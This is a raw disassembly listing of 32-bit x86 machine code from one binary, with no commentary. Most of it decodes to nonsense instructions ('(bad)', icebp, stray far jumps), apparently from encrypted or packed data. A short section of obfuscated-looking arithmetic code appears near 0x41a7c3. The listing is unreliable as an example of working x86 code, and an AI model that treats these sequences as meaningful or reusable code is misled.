  41a208:	imul   ebx,DWORD PTR [ecx-0x580b0df],0xffffffc3
  41a20f:	inc    edi
  41a210:	icebp  
  41a211:	push   ebx
  41a212:	(bad)  
  41a213:	icebp  
  41a214:	imul   ebx,DWORD PTR [edx],0xc3166b75
  41a21a:	jmp    0x41a19f
  41a21c:	add    al,BYTE PTR [ecx-0x7f]
  41a21f:	fstp   DWORD PTR [edi]
  41a221:	mov    dl,0x49
  41a223:	mov    dh,0x93
  41a225:	fidiv  WORD PTR [esi+ebx*8+0x15]
  41a229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a22a:	push   ds
  41a22b:	xchg   ch,dh
  41a22d:	jmp    0x967f:0x14afa8cc
  41a234:	push   ebp
  41a235:	dec    eax
  41a236:	and    DWORD PTR [edi],eax
  41a238:	adc    BYTE PTR [edx],ch
  41a23a:	mov    bh,0xba
  41a23c:	stos   DWORD PTR es:[edi],eax
  41a23d:	jge    0x41a1da
  41a23f:	repnz cmp eax,0x3ed2bc75
  41a245:	xchg   bh,bh
  41a247:	mov    dl,0x69
  41a249:	cmp    eax,DWORD PTR [ebx+0x79]
  41a24c:	jecxz  0x41a205
  41a24e:	call   0xf7e5:0xf5173578
  41a255:	(bad)  
  41a257:	jge    0x41a284
  41a259:	sub    BYTE PTR [eax+edi*8+0x55],dl
  41a25d:	sbb    BYTE PTR [ebp+0x7addd19],dh
  41a263:	stos   DWORD PTR es:[edi],eax
  41a264:	daa    
  41a265:	loope  0x41a29d
  41a267:	adc    DWORD PTR [ebp+0x45],esi
  41a26a:	jp     0x41a242
  41a26c:	cmp    BYTE PTR ds:0x1d78fa57,dh
  41a272:	sub    esi,DWORD PTR [ebx-0x77]
  41a275:	cmp    BYTE PTR [edi+0x12],dh
  41a278:	sahf   
  41a279:	in     al,dx
  41a27a:	mov    dh,0x1a
  41a27c:	inc    eax
  41a27d:	das    
  41a27e:	loope  0x41a266
  41a280:	or     edx,DWORD PTR [esi]
  41a282:	dec    ecx
  41a283:	xor    al,0xe5
  41a285:	xor    BYTE PTR [ebx],al
  41a287:	popf   
  41a288:	ds mov dh,0x2a
  41a28b:	mov    ch,al
  41a28d:	loop   0x41a2dd
  41a28f:	imul   edx,DWORD PTR [edi+0x26],0xd16b41b2
  41a296:	(bad)  
  41a297:	sar    BYTE PTR [edx-0x47],1
  41a29a:	inc    edx
  41a29b:	xchg   DWORD PTR [ebx+0x2dec5243],eax
  41a2a1:	fs call 0xa15905ee
  41a2a7:	mov    esi,0x2c0760af
  41a2ac:	push   es
  41a2ad:	xor    ch,dh
  41a2af:	jnp    0x41a2ff
  41a2b1:	mov    ds:0x3a98fe64,eax
  41a2b6:	(bad)  
  41a2b7:	pushf  
  41a2b8:	(bad)  
  41a2b9:	mov    ah,0x88
  41a2bb:	and    eax,0x386ed1c3
  41a2c0:	int3   
  41a2c1:	mov    cs,WORD PTR [edi+0x77]
  41a2c4:	sbb    BYTE PTR ds:0x5090f3ae,0x34
  41a2cb:	add    bl,bh
  41a2cd:	in     eax,0x83
  41a2cf:	jne    0x41a2d0
  41a2d1:	aam    0x25
  41a2d3:	jl     0x41a2b6
  41a2d5:	xchg   ebx,eax
  41a2d6:	add    al,0x8f
  41a2d8:	not    dl
  41a2da:	icebp  
  41a2db:	pop    ebx
  41a2dc:	rcr    DWORD PTR [esi],1
  41a2de:	mov    ?,WORD PTR [edx]
  41a2e0:	jb     0x41a34f
  41a2e2:	out    0x5b,al
  41a2e4:	xchg   DWORD PTR [ebx+0x79],ebp
  41a2e7:	outs   dx,DWORD PTR ds:[esi]
  41a2e8:	ret    
  41a2e9:	retf   
  41a2ea:	sub    al,0x9
  41a2ec:	dec    edi
  41a2ed:	xor    BYTE PTR [ebx],cl
  41a2ef:	sub    DWORD PTR [eax],ebx
  41a2f1:	or     eax,0x5ef6d5f5
  41a2f6:	push   esp
  41a2f7:	mov    DWORD PTR [ebp-0x15],ecx
  41a2fa:	test   al,0x26
  41a2fc:	in     al,0x8b
  41a2fe:	and    DWORD PTR ds:0x76fddaf,edx
  41a304:	pop    ecx
  41a305:	sub    esp,DWORD PTR [eax+edx*1-0x8]
  41a309:	aas    
  41a30a:	mov    ah,0xef
  41a30c:	stos   DWORD PTR es:[edi],eax
  41a30d:	gs pop eax
  41a30f:	pop    ebx
  41a310:	cmp    DWORD PTR [ebx+ebp*4+0x20],0x24
  41a315:	arpl   WORD PTR [eax-0x2e],di
  41a318:	call   0x2018ae8a
  41a31d:	xchg   ecx,eax
  41a31e:	mov    dh,0x38
  41a320:	xlat   BYTE PTR ds:[ebx]
  41a321:	repnz add al,BYTE PTR [ecx]
  41a324:	mov    eax,0x5dfe52aa
  41a329:	dec    ebp
  41a32a:	cmp    al,0x3
  41a32c:	pop    ss
  41a32d:	or     eax,0xd93fe85e
  41a332:	mov    edx,0x5e4504e0
  41a337:	aas    
  41a338:	mov    WORD PTR [ecx-0x24],fs
  41a33b:	sar    BYTE PTR [ecx-0x5341ab9b],cl
  41a341:	sub    eax,0x37853253
  41a346:	xor    edi,DWORD PTR [ebx-0x73029e01]
  41a34c:	xchg   esp,eax
  41a34d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a34e:	(bad)  
  41a34f:	sar    al,0x51
  41a352:	sub    BYTE PTR [ecx-0x43d363da],cl
  41a358:	ret    
  41a359:	sbb    BYTE PTR [ebx+eiz*8],dl
  41a35c:	loope  0x41a347
  41a35e:	outs   dx,DWORD PTR ds:[esi]
  41a35f:	sbb    DWORD PTR [edi+esi*4],ecx
  41a362:	popf   
  41a363:	pop    esi
  41a364:	adc    ah,BYTE PTR [edx]
  41a366:	inc    ebx
  41a367:	(bad)  
  41a368:	push   0x714f7650
  41a36d:	adc    al,0x25
  41a36f:	mov    edi,0xd2b079c3
  41a374:	daa    
  41a375:	mov    esi,DWORD PTR [ecx]
  41a377:	jmp    FWORD PTR [edx+0x3f5f1c92]
  41a37d:	or     ah,BYTE PTR [ebx]
  41a37f:	mov    esi,0xc29d725d
  41a384:	jmp    0x9929:0x11a4d02e
  41a38b:	ins    DWORD PTR es:[edi],dx
  41a38c:	jmp    0x9e0526d3
  41a391:	cli    
  41a392:	cmp    BYTE PTR [ebx],al
  41a394:	ret    
  41a395:	or     eax,0xef34ca5f
  41a39a:	outs   dx,BYTE PTR ds:[esi]
  41a39b:	mov    esp,0x28d4be79
  41a3a0:	sbb    DWORD PTR [edx+0x229f3f9a],edi
  41a3a6:	hlt    
  41a3a7:	out    0xca,al
  41a3a9:	cmp    dh,cl
  41a3ab:	test   eax,0xbadb056a
  41a3b0:	outs   dx,DWORD PTR ds:[esi]
  41a3b1:	or     eax,0xab8c8af0
  41a3b6:	popa   
  41a3b7:	ins    DWORD PTR es:[edi],dx
  41a3b8:	sub    al,0xb4
  41a3ba:	test   DWORD PTR [esi+0x9],esi
  41a3bd:	xor    al,bh
  41a3bf:	pop    edi
  41a3c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3c1:	and    al,0x16
  41a3c3:	jbe    0x41a3ed
  41a3c5:	(bad)  
  41a3c6:	jns    0x41a43e
  41a3c8:	xchg   ebx,eax
  41a3c9:	add    al,0x1
  41a3cb:	push   edi
  41a3cc:	faddp  st(4),st
  41a3ce:	sub    DWORD PTR [edi-0x5b2df724],esi
  41a3d4:	inc    BYTE PTR [edx+0x32]
  41a3d7:	jbe    0x41a3cf
  41a3d9:	hlt    
  41a3da:	jbe    0x41a3c6
  41a3dc:	popa   
  41a3dd:	dec    edx
  41a3de:	ja     0x41a396
  41a3e0:	xchg   ebp,eax
  41a3e1:	xchg   esi,eax
  41a3e2:	in     al,dx
  41a3e3:	ret    
  41a3e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e5:	bound  ecx,QWORD PTR [edx-0x22]
  41a3e8:	xor    edi,DWORD PTR [ebx-0x6]
  41a3eb:	repz fcomp DWORD PTR [ebx+0x505d6297]
  41a3f3:	inc    edi
  41a3f4:	loope  0x41a431
  41a3f6:	or     BYTE PTR [esi-0x32],bl
  41a3f9:	popa   
  41a3fa:	icebp  
  41a3fb:	ud0    ecx,ecx
  41a3fe:	lea    edi,[ecx]
  41a400:	adc    al,0x33
  41a402:	push   esp
  41a403:	mov    esp,0xff0ed0d9
  41a408:	add    edi,esp
  41a40a:	ror    BYTE PTR [eax+edi*8],cl
  41a40d:	sub    al,0xb
  41a40f:	mov    ecx,0x9607ead6
  41a414:	cwde   
  41a415:	sar    edx,cl
  41a417:	inc    edx
  41a418:	dec    esi
  41a419:	mov    al,ds:0x410d52d2
  41a41e:	ins    DWORD PTR es:[edi],dx
  41a41f:	add    esp,DWORD PTR [ebx]
  41a421:	ja     0x41a425
  41a423:	inc    edi
  41a424:	xchg   edi,eax
  41a425:	cdq    
  41a426:	add    al,0x49
  41a428:	enter  0x2c22,0x8a
  41a42c:	or     al,0x20
  41a42e:	shl    DWORD PTR [esi+0x9020f96],1
  41a434:	test   cl,dh
  41a436:	mov    cl,0xdf
  41a438:	add    dl,BYTE PTR [edx+edi*4-0x54]
  41a43c:	mov    dl,0x72
  41a43e:	sub    ebp,DWORD PTR [edi]
  41a440:	mov    esp,0x50975cf5
  41a445:	and    dl,BYTE PTR [eax]
  41a447:	jle    0x41a3cf
  41a449:	or     ch,ch
  41a44b:	jmp    0xe8ece955
  41a450:	sbb    DWORD PTR [ecx-0x7d77e8f6],esp
  41a456:	aas    
  41a457:	push   0x2384b211
  41a45c:	dec    edi
  41a45d:	and    BYTE PTR [eax],dl
  41a45f:	pop    ss
  41a460:	test   cl,al
  41a462:	(bad)  
  41a463:	leave  
  41a464:	scas   al,BYTE PTR es:[edi]
  41a465:	jno    0x41a4d4
  41a467:	push   ebx
  41a468:	arpl   si,di
  41a46a:	cdq    
  41a46b:	or     BYTE PTR [ebx],0xc
  41a46e:	jnp    0x41a42a
  41a470:	rol    DWORD PTR [edi-0x493cede7],1
  41a476:	(bad)  
  41a477:	jno    0x41a4c7
  41a479:	xchg   DWORD PTR [ecx-0x14],ebx
  41a47c:	dec    eax
  41a47d:	shr    ecx,cl
  41a47f:	jb     0x41a4c6
  41a481:	rol    BYTE PTR [esi-0x33],1
  41a484:	xchg   esp,eax
  41a485:	rcl    ch,cl
  41a487:	pop    ds
  41a488:	(bad)  
  41a489:	lds    esp,FWORD PTR [edi+0x52dee89e]
  41a48f:	lea    esi,[ecx+0x5c]
  41a492:	sahf   
  41a493:	int3   
  41a494:	mov    ah,0x11
  41a496:	outs   dx,DWORD PTR ds:[esi]
  41a497:	inc    edx
  41a498:	sub    DWORD PTR [ebx+0x55],esi
  41a49b:	popf   
  41a49c:	mov    eax,ds:0xcabcc1e7
  41a4a1:	mov    DWORD PTR [edx+0x2be1fe9a],ecx
  41a4a7:	je     0x41a51f
  41a4a9:	shl    BYTE PTR [esp+edi*8-0x67],1
  41a4ad:	pop    eax
  41a4ae:	sbb    ebx,DWORD PTR [edx-0x32]
  41a4b1:	or     esp,ecx
  41a4b3:	(bad)  
  41a4b4:	adc    bh,BYTE PTR [ebp-0xe]
  41a4b7:	gs fwait
  41a4b9:	jle    0x41a4ab
  41a4bb:	xor    al,0xa2
  41a4bd:	mov    ah,0x57
  41a4bf:	fisubr WORD PTR [eax+ebp*8+0x7f]
  41a4c3:	scas   eax,DWORD PTR es:[edi]
  41a4c4:	arpl   WORD PTR [edi-0x28],bx
  41a4c7:	dec    ecx
  41a4c8:	jb     0x41a4c3
  41a4ca:	js     0x41a53c
  41a4cc:	adc    eax,0xbd617e98
  41a4d1:	fcmovnb st,st(5)
  41a4d3:	mov    al,0x92
  41a4d5:	cwde   
  41a4d6:	mov    ah,0xc2
  41a4d8:	sbb    ah,dl
  41a4da:	mov    WORD PTR [esi-0xe],ss
  41a4dd:	lea    esi,[eax+0x6293d375]
  41a4e3:	lods   eax,DWORD PTR ds:[esi]
  41a4e4:	loopne 0x41a557
  41a4e6:	mov    edi,0xe02bb8e
  41a4eb:	stos   DWORD PTR es:[edi],eax
  41a4ec:	mov    ch,0xba
  41a4ee:	ins    DWORD PTR es:[edi],dx
  41a4ef:	dec    esp
  41a4f0:	outs   dx,BYTE PTR ds:[esi]
  41a4f1:	jp     0x41a473
  41a4f3:	imul   ebp,DWORD PTR [edi-0x362848d3],0xadbe6faf
  41a4fd:	(bad)  
  41a4fe:	(bad)  
  41a4ff:	mov    cl,0xbd
  41a501:	sub    eax,0xdfc72860
  41a506:	aam    0xc1
  41a508:	push   cs
  41a509:	xor    al,0x26
  41a50b:	aas    
  41a50c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a50d:	mov    ds:0xc04766ab,al
  41a512:	mov    al,0x9
  41a514:	sbb    BYTE PTR ds:[eax],0xa1
  41a518:	xor    edx,esp
  41a51a:	adc    BYTE PTR [ebx],dh
  41a51c:	stos   DWORD PTR es:[edi],eax
  41a51d:	add    esi,DWORD PTR [esi]
  41a51f:	fst    DWORD PTR [ebp-0x436014af]
  41a525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a526:	(bad)  
  41a527:	ss cdq 
  41a529:	pop    esi
  41a52a:	(bad)  
  41a52b:	out    dx,eax
  41a52c:	jle    0x41a5a4
  41a52e:	xor    al,0xd6
  41a530:	enter  0xe854,0xc3
  41a534:	push   esi
  41a535:	jmp    0x41a4c7
  41a537:	jne    0x41a500
  41a539:	pop    es
  41a53a:	mov    cl,0xf1
  41a53c:	and    BYTE PTR [ecx+0x69],ch
  41a53f:	xchg   edi,eax
  41a540:	mov    DWORD PTR [ecx+ebx*1-0xbf49fee],edx
  41a547:	push   ss
  41a548:	lds    esi,FWORD PTR [edx-0x7aec42c4]
  41a54e:	mov    cl,0x4
  41a550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a551:	(bad)  
  41a552:	call   0x604d0690
  41a557:	dec    esp
  41a558:	je     0x41a536
  41a55a:	adc    BYTE PTR [ebp-0x33c21d01],bh
  41a560:	popf   
  41a561:	cmp    DWORD PTR cs:[edi-0x4f],eax
  41a565:	stos   BYTE PTR es:[edi],al
  41a566:	push   eax
  41a567:	jbe    0x41a50a
  41a569:	and    esi,DWORD PTR [edx+0x70c498ae]
  41a56f:	add    bl,0x53
  41a572:	fnstcw WORD PTR ds:0x61eff9af
  41a578:	push   cs
  41a579:	jbe    0x41a500
  41a57b:	fldcw  WORD PTR [ebp-0x57]
  41a57e:	scas   al,BYTE PTR es:[edi]
  41a57f:	xchg   ebx,eax
  41a580:	leave  
  41a581:	(bad)  
  41a583:	loopne 0x41a522
  41a585:	pushf  
  41a586:	pop    esi
  41a587:	push   0x5888cea2
  41a58c:	push   0xffffffdd
  41a58e:	lods   eax,DWORD PTR ds:[esi]
  41a58f:	push   ss
  41a590:	ficomp WORD PTR [edx+0xa8e37d7]
  41a596:	mov    eax,0xc5110f96
  41a59b:	fild   DWORD PTR [ebx]
  41a59d:	(bad)  
  41a59e:	mul    DWORD PTR [edi+0x27]
  41a5a1:	sahf   
  41a5a2:	adc    edi,DWORD PTR [edx+0x5a]
  41a5a5:	add    bl,BYTE PTR [ecx]
  41a5a7:	outs   dx,BYTE PTR ds:[esi]
  41a5a8:	in     eax,0xdb
  41a5aa:	stos   DWORD PTR es:[edi],eax
  41a5ab:	or     al,0x6f
  41a5ad:	je     0x41a573
  41a5af:	lods   eax,DWORD PTR ds:[esi]
  41a5b0:	jb     0x41a5de
  41a5b2:	and    ah,cl
  41a5b4:	mov    ebx,0x2675484c
  41a5b9:	clc    
  41a5ba:	out    0x47,al
  41a5bc:	mov    esi,0x5e9ae04d
  41a5c1:	leave  
  41a5c2:	add    ecx,DWORD PTR [edi+0x69ad278a]
  41a5c8:	sbb    eax,0xd08df102
  41a5cd:	mov    dh,0xde
  41a5cf:	(bad)  
  41a5d1:	pushf  
  41a5d2:	inc    ecx
  41a5d3:	enter  0xcea3,0x33
  41a5d7:	mov    ebp,0xee62761c
  41a5dc:	ds mov esi,0xe8784351
  41a5e2:	mov    cl,0x20
  41a5e4:	ret    0xa4c4
  41a5e7:	xchg   edi,eax
  41a5e8:	mov    ebx,0x42fd9043
  41a5ed:	int3   
  41a5ee:	jmp    0x2f6d:0xde183530
  41a5f5:	ss push 0x9418e54
  41a5fb:	arpl   WORD PTR [ebx-0x46ff183c],dx
  41a601:	cwde   
  41a602:	sar    DWORD PTR [ebx-0x3a3dab26],cl
  41a608:	cmovge esp,DWORD PTR [esi-0x46]
  41a60c:	(bad)  
  41a60d:	enter  0xa72e,0xf4
  41a611:	mov    ebx,0x1c039419
  41a616:	or     DWORD PTR [ecx],ecx
  41a618:	mov    bh,0xc
  41a61a:	dec    edi
  41a61b:	add    esp,DWORD PTR [edi]
  41a61d:	call   0x8f551ea4
  41a622:	dec    eax
  41a623:	aaa    
  41a624:	and    DWORD PTR [eax+0x73],ebx
  41a627:	or     ebx,edx
  41a629:	adc    eax,esi
  41a62b:	push   ebp
  41a62c:	inc    esp
  41a62d:	imul   esi,DWORD PTR [eax+0x2],0xda9a04aa
  41a634:	pop    ebp
  41a635:	jle    0x41a5b7
  41a637:	fucomi st,st(5)
  41a639:	scas   eax,DWORD PTR es:[edi]
  41a63a:	sub    al,0xb
  41a63c:	call   0x7799:0xb5e4b1a8
  41a643:	xlat   BYTE PTR ds:[ebx]
  41a644:	call   0x647821d
  41a649:	aam    0x74
  41a64b:	out    0xd1,al
  41a64d:	jmp    0x83d10be0
  41a652:	ds dec ebx
  41a654:	es mov ecx,0x7101347b
  41a65a:	(bad)  
  41a65c:	(bad)  
  41a65d:	sub    eax,0x52a9ce0b
  41a662:	cli    
  41a663:	dec    ebx
  41a664:	test   eax,0x487d2727
  41a669:	enter  0x94b8,0xac
  41a66d:	ror    DWORD PTR [ebx],1
  41a66f:	fisttp QWORD PTR [ebp-0x5d]
  41a672:	mov    dh,0xb7
  41a674:	bound  esp,QWORD PTR [edi+ebx*8]
  41a677:	inc    esp
  41a678:	push   ebx
  41a679:	xchg   edi,eax
  41a67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a67b:	int    0xde
  41a67d:	mov    ds:0xbbbbd600,al
  41a682:	inc    ebp
  41a683:	push   0xcc324897
  41a688:	fs add eax,0xf5fd67a4
  41a68e:	inc    eax
  41a68f:	imul   ebx,DWORD PTR [edi+0x15],0xffffffcd
  41a693:	push   eax
  41a694:	mov    cl,0x9
  41a696:	dec    esp
  41a697:	aad    0xdb
  41a699:	add    BYTE PTR [ebx+0x29],bh
  41a69c:	dec    esp
  41a69d:	xor    al,0x6
  41a6a0:	ret    
  41a6a1:	sbb    DWORD PTR [edi+0x51],ebp
  41a6a4:	push   cs
  41a6a5:	jbe    0x41a6c5
  41a6a7:	pop    eax
  41a6a8:	pop    ebp
  41a6a9:	imul   dl
  41a6ab:	mov    eax,ds:0xea5697e4
  41a6b0:	or     DWORD PTR [esi+0x23faa011],esi
  41a6b6:	cmp    edi,0x358e14e3
  41a6bc:	xchg   edx,eax
  41a6bd:	test   eax,0x9154aa90
  41a6c2:	ret    
  41a6c3:	add    BYTE PTR [edi],dh
  41a6c5:	clc    
  41a6c6:	leave  
  41a6c7:	sbb    eax,0xc4347a30
  41a6cc:	jae    0x41a6e3
  41a6ce:	ret    
  41a6cf:	pop    es
  41a6d0:	sub    eax,0x1b26f3c8
  41a6d5:	test   al,0xf7
  41a6d7:	cmp    BYTE PTR [ebx],0xfb
  41a6da:	test   ebp,ecx
  41a6dc:	(bad)  
  41a6dd:	mov    ebp,0x5da12c0d
  41a6e2:	jnp    0x41a68f
  41a6e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e5:	adc    BYTE PTR ds:0x51fd9cd3,ah
  41a6eb:	jo     0x41a6c6
  41a6ed:	and    BYTE PTR [edi],ah
  41a6ef:	stos   DWORD PTR es:[edi],eax
  41a6f0:	sub    BYTE PTR [eax+ebx*4-0x4f],al
  41a6f4:	add    al,0x37
  41a6f6:	push   es
  41a6f7:	xchg   edx,eax
  41a6f8:	mov    eax,0xfdb16282
  41a6fd:	test   DWORD PTR [ecx-0x776eb9c0],eax
  41a703:	popf   
  41a704:	sbb    ebp,eax
  41a706:	and    DWORD PTR [ebx-0x474c406],ebx
  41a70c:	push   edx
  41a70d:	mov    dl,0x79
  41a70f:	push   DWORD PTR [ecx-0x35]
  41a712:	add    esp,DWORD PTR [esi+0x2bcd0dc2]
  41a718:	jnp    0x41a763
  41a71a:	xchg   esp,eax
  41a71b:	and    ebx,ebp
  41a71d:	call   0x4637ccbc
  41a722:	imul   esi,DWORD PTR [ebx+0x3c0404ef],0xffffffb0
  41a729:	xor    DWORD PTR [ebx-0x1689cade],edx
  41a72f:	aas    
  41a730:	and    BYTE PTR [esp+ebx*4-0x59],ah
  41a734:	mov    bl,0x26
  41a736:	push   edi
  41a737:	push   esi
  41a738:	mov    ch,0xc0
  41a73a:	xchg   ebx,eax
  41a73b:	(bad)  
  41a73c:	imul   esp,DWORD PTR [esi],0x7d2b3db5
  41a742:	into   
  41a743:	ja     0x41a7b7
  41a745:	adc    dl,0x74
  41a748:	push   es
  41a749:	(bad)  
  41a74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a74b:	push   0x6a
  41a74d:	nop
  41a74e:	xor    DWORD PTR [ebx-0x1c],ebx
  41a751:	inc    esp
  41a752:	jb     0x41a753
  41a754:	int    0x61
  41a756:	jb     0x41a70a
  41a758:	or     DWORD PTR [edi+0x62],edx
  41a75b:	in     eax,0x37
  41a75d:	aam    0x16
  41a75f:	not    BYTE PTR [ecx+ebx*1-0x261b8ef5]
  41a766:	xor    eax,0x833c17f3
  41a76b:	js     0x41a7b2
  41a76d:	sbb    al,0xfb
  41a76f:	sub    al,BYTE PTR [ecx+eax*8+0x5c1011d3]
  41a776:	pop    es
  41a777:	stos   BYTE PTR es:[edi],al
  41a778:	or     al,0xe4
  41a77a:	add    eax,0x87026ae1
  41a77f:	jb     0x41a748
  41a781:	xlat   BYTE PTR ds:[ebx]
  41a782:	adc    eax,0xbd7e28d2
  41a787:	add    eax,0x71
  41a78a:	jmp    0x18069e98
  41a78f:	call   0x8d3b:0x8cf4bcc1
  41a796:	mov    esi,0xaa74d151
  41a79b:	fwait
  41a79c:	dec    esi
  41a79d:	out    dx,al
  41a79e:	gs std 
  41a7a0:	imul   eax,eax,0x2497659e
  41a7a6:	cmp    bh,BYTE PTR [eax-0x1c]
  41a7a9:	add    al,BYTE PTR [ecx]
  41a7ab:	aaa    
  41a7ac:	xchg   ecx,eax
  41a7ad:	sub    BYTE PTR [ecx-0x6a2bf353],al
  41a7b3:	sub    bl,BYTE PTR [esi+0x17]
  41a7b6:	leave  
  41a7b7:	loope  0x41a7d3
  41a7b9:	mov    ecx,0x2ea41af7
  41a7be:	cs sub ecx,ebp
  41a7c1:	xor    al,0xc0
  41a7c3:	mov    edx,DWORD PTR [ebp-0x14]
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2+0x19ceb52e]
  41a82d:	lds    edx,FWORD PTR [eax+0x407c7d13]
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	ins    DWORD PTR es:[edi],dx
  41a837:	sbb    bl,al
  41a839:	fst    QWORD PTR [ecx-0x77]
  41a83c:	xor    al,0xe1
  41a83e:	pop    edi
  41a83f:	jmp    0x16b6f73a
  41a844:	in     eax,0x47
  41a846:	sub    cl,bl
  41a848:	mov    bh,0x12
  41a84a:	retf   0x5a3e
  41a84d:	test   ch,al
  41a84f:	dec    esp
  41a850:	fst    st(3)
  41a852:	push   ebx
  41a853:	sub    eax,0xe852d529
  41a858:	mov    edx,0xa9e038f7
  41a85d:	lods   al,BYTE PTR ds:[esi]
  41a85e:	xor    eax,0x527fb501
  41a863:	not    DWORD PTR [edi-0x3a]
  41a866:	push   ebx
  41a867:	lds    eax,FWORD PTR [edi]
  41a869:	pushf  
  41a86a:	xor    bh,BYTE PTR [esi+0xf]
  41a86d:	lock iret 
  41a86f:	out    0x29,eax
  41a871:	mov    edi,DWORD PTR [ecx-0x7]
  41a874:	jmp    0x41a84e
  41a876:	lock stos DWORD PTR es:[edi],eax
  41a878:	inc    ecx
  41a879:	stos   DWORD PTR es:[edi],eax
  41a87a:	push   edx
  41a87b:	or     al,0xb4
  41a87d:	xor    eax,0xf345f391
  41a882:	fsub   DWORD PTR [ebx]
  41a884:	test   BYTE PTR [edi-0x51d46e25],ch
  41a88a:	int    0x1e
  41a88c:	call   0x1cd33b0b
  41a891:	cmp    al,0x7b
  41a893:	fs loopne 0x41a8d9
  41a896:	add    al,BYTE PTR [edi+edx*1+0x49a36d0]
  41a89d:	outs   dx,DWORD PTR ds:[esi]
  41a89e:	push   ebx
  41a89f:	leave  
  41a8a0:	ins    BYTE PTR es:[edi],dx
  41a8a1:	sbb    BYTE PTR [edi+0x268cd287],al
  41a8a7:	outs   dx,BYTE PTR ds:[esi]
  41a8a8:	aas    
  41a8a9:	sbb    eax,edi
  41a8ab:	in     eax,dx
  41a8ac:	rol    dl,cl
  41a8ae:	add    ebx,DWORD PTR [esi+0x36]
  41a8b1:	add    esi,DWORD PTR [ebx-0x7b25d8f0]
  41a8b7:	ret    
  41a8b8:	pop    es
  41a8b9:	jnp    0x41a8d0
  41a8bb:	das    
  41a8bc:	pushf  
  41a8bd:	jl     0x41a843
  41a8bf:	clc    
  41a8c0:	bound  esi,QWORD PTR [ecx+ecx*1]
  41a8c3:	inc    edi
  41a8c4:	jns    0x41a924
  41a8c6:	icebp  
  41a8c7:	stc    
  41a8c8:	and    BYTE PTR [ebx+0x52],al
  41a8cb:	mov    ch,0x2f
  41a8cd:	mov    BYTE PTR [ebx-0x5a],al
  41a8d0:	and    al,0xce
  41a8d2:	push   esp
  41a8d3:	jbe    0x41a91d
  41a8d5:	mov    ebx,0x3370c646
  41a8da:	retf   
  41a8db:	mov    dl,0x7e
  41a8dd:	xor    al,0x90
  41a8df:	arpl   cx,cx
  41a8e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e2:	dec    eax
  41a8e3:	push   0x5e
  41a8e5:	jecxz  0x41a876
  41a8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e8:	pusha  
  41a8e9:	xchg   edx,eax
  41a8ea:	and    BYTE PTR ds:0x98c1dc2e,dh
  41a8f0:	cmp    al,0xa6
  41a8f2:	push   ebp
  41a8f3:	mov    ecx,0x5975528f
  41a8f8:	ins    DWORD PTR es:[edi],dx
  41a8f9:	mov    WORD PTR [esi],?
  41a8fb:	retf   
  41a8fc:	mov    dl,0x8f
  41a8fe:	out    0x8c,eax
  41a900:	sub    dh,BYTE PTR [edx+0x1ee1e8c7]
  41a906:	mov    BYTE PTR [ecx+0x35],cl
  41a909:	clc    
  41a90a:	xchg   DWORD PTR [ecx+0x4885d084],ecx
  41a910:	xchg   esi,eax
  41a911:	fbld   TBYTE PTR [eax]
  41a913:	stos   BYTE PTR es:[edi],al
  41a914:	inc    esp
  41a915:	fstp   st(5)
  41a917:	stos   BYTE PTR es:[edi],al
  41a918:	leave  
  41a919:	mov    BYTE PTR [edx],dh
  41a91b:	outs   dx,BYTE PTR ds:[esi]
  41a91c:	mov    dh,0x7b
  41a91e:	retf   0x5259
  41a921:	sub    DWORD PTR es:[ecx+0x30b2b3d1],edx
  41a928:	popa   
  41a929:	sbb    eax,0xdaa9b1fb
  41a92e:	xchg   ebx,eax
  41a92f:	test   eax,0x2200293e
  41a934:	retf   0xc4d8
  41a937:	push   0xffffffdb
  41a939:	xchg   DWORD PTR [edi+0x4a447076],eax
  41a93f:	cmp    al,0x3e
  41a941:	fcomp  DWORD PTR [eax+0x16]
  41a944:	mov    al,ds:0xa732f6da
  41a949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a94a:	(bad)  
  41a94b:	repz xchg ebp,eax
  41a94d:	xor    eax,0x135d0de1
  41a952:	div    DWORD PTR [ebp-0x6f90930f]
  41a958:	in     eax,dx
  41a959:	xchg   ebp,eax
  41a95a:	(bad)  
  41a95b:	mov    esp,0x802d8f0e
  41a960:	pop    ss
